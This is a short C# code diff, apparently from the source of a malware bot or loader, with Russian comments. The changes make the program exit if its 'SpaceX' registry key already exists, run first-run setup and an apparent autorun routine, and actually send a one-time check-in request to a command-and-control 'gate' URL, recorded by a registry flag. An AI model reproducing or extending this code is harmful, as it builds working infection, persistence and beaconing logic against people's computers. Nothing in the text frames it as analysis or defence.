@@ -16,13 +16,18 @@
                 RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\");
 
                 if (ProgramFolder != null)
-                { }
+                {
+                    Application.Exit();
+                }
                 else
                 {
                     SetFirstSettings();
-                    AR();                    
+                    AR();
+                }
+                if (ProgramFolder != null)
+                {
                     ProgramFolder.Close();
-                }                
+                }
             }
             catch { }
         }
@@ -46,7 +51,7 @@
             }
             if (CreateRegFolder.GetValue("GATE").ToString() != "YES") // проверка на отправку на гейт
             {
-                HttpWebRequest.Create(Program.Gate);
+                HttpWebRequest.Create(Program.Gate).GetResponse();
                 CreateRegFolder.DeleteValue("GATE");
                 CreateRegFolder.SetValue("GATE", "YES"); // меняем значение
             }
